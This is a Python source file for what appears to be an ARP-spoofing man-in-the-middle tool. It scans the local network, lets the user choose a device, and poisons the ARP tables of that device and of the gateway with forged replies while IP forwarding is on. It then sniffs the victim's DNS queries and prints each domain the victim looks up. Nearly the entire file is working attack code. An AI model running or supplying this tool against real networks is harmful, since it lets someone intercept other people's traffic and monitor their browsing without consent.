import signal
import platform
import subprocess
import threading
import scapy.all as scapy
from scapy.all import ARP
from scapy.layers.dns import DNS
from colorama import Fore, Style
from time import strftime, localtime
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

exit_event = threading.Event()

def signal_handler(signum, frame) -> None:
    exit_event.set()

def arp_scan(network: str, iface: str):
    ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=10, iface=iface)
    print(f"{Fore.RED}########## NETWORK DEVICES ##########{Style.RESET_ALL}\n")
    for num, i in enumerate(ans):
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = "unrecognized device"
        print(f"{num + 1}) {Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})")
    return input("\nEnter device IP: ")

class ArpSpoofer:
    def __init__(self, interface: str, gateway_ip: str, target_ip: str=None, output_pcap_file: str=None) -> None:
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.output_pcap_file = output_pcap_file
    
    def port_forward(self, toggle: bool=True) -> tuple[str, str]:
        # TODO: move to helpers
        os_platform = platform.system()

        if toggle:
            if os_platform == "Darwin":
                res = subprocess.run("sysctl -w net.inet.ip.forwarding=1", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                stdout = res.stdout.replace("\n", "")
                stderr = res.stderr
                output = (stdout, stderr)
                print(output)

            else:
                res = subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                stdout = res.stdout.replace("\n", "")
                stderr = res.stderr
                output = (stdout, stderr)
        else:
            if os_platform == "Darwin":
                res = subprocess.run("sysctl -w net.inet.ip.forwarding=0", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                stdout = res.stdout.replace("\n", "")
                stderr = res.stderr
                output = (stdout, stderr)
                print(output)
            else:
                res = subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) 
                stdout = res.stdout.replace("\n", "")
                stderr = res.stderr
                output = (stdout, stderr)
        
        return output

    def get_mac(self, ip: str) -> str:
        """Sends ARP request to get mac address based on input ip."""
        try:
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            request = scapy.ARP(pdst=ip)
            ans, _ = scapy.srp(broadcast / request, iface=self.interface, timeout=5, verbose=False)
            for i in ans:
                mac = i.answer[ARP].hwsrc
                ip = i.answer[ARP].psrc
            return mac
        except UnboundLocalError:
            pass
        except Exception as error:
            print(error)
    
    def spoof(self, target_ip: str, spoof_ip: str) -> None:
        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
        scapy.send(packet, iface=self.interface, verbose=False)
    
    def restore(self, source_ip: str, dest_ip: str) -> None:
        """Restore ARP table to original state."""
        src_mac = self.get_mac(source_ip)
        dst_mac = self.get_mac(dest_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dst_mac, psrc=source_ip, hwsrc=src_mac)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.GREEN + f"[+] Restoring {dest_ip} to its original state.{Style.RESET_ALL}")
    
    def execute_mitm(self) -> None:
        try:
            self.port_forward()
            print(Fore.YELLOW + f"[+] Spoofing {self.target_ip}, pretending to be {self.gateway_ip}{Style.RESET_ALL}")
            print(Fore.YELLOW + f"[+] Spoofing {self.gateway_ip}, pretending to be {self.target_ip}{Style.RESET_ALL}")
            # MITM on en0: ['f8:08:4f:fb:e7:68'] <--> e2:ec:6c:75:e0:b9 <--> ['20:1f:3b:9d:22:89']
            while True:
                if exit_event.is_set():
                    if KeyboardInterrupt:
                        raise KeyboardInterrupt
                    if Exception:
                        raise Exception
                self.spoof(target_ip=self.target_ip, spoof_ip=self.gateway_ip)
                self.spoof(target_ip=self.gateway_ip, spoof_ip=self.target_ip)
        except (Exception, KeyboardInterrupt) as error:
            if KeyboardInterrupt:
                print(Fore.YELLOW + f"\n[!] Detected CTRL+C. Restoring ARP tables... Please wait.{Style.RESET_ALL}")
            else:
                print(error)
            self.restore(source_ip=self.target_ip, dest_ip=self.gateway_ip)
            self.restore(source_ip=self.gateway_ip, dest_ip=self.target_ip)
            self.port_forward(toggle=False)
            print(Fore.GREEN + f"[+] ARP tables restored.{Style.RESET_ALL}")
    
    def capture_packets(self) -> None:
        scapy.sniff(iface=self.interface, prn=self.process_packet, filter=f"src host {self.target_ip} and udp port 53", store=False)
    
    def process_packet(self, pkt) -> None:
        record = pkt[DNS].qd.qname.decode("UTF-8").strip(".")
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f"[{Fore.GREEN}{time} | {Fore.BLUE}{self.target_ip} -> {Fore.RED}{record}{Style.RESET_ALL}]")
    
    def watch(self):
        signal.signal(signal.SIGINT, signal_handler)

        t1 = threading.Thread(target=self.execute_mitm, args=())
        t2 = threading.Thread(target=self.capture_packets, args=(), daemon=True)

        t1.start()
        t2.start()
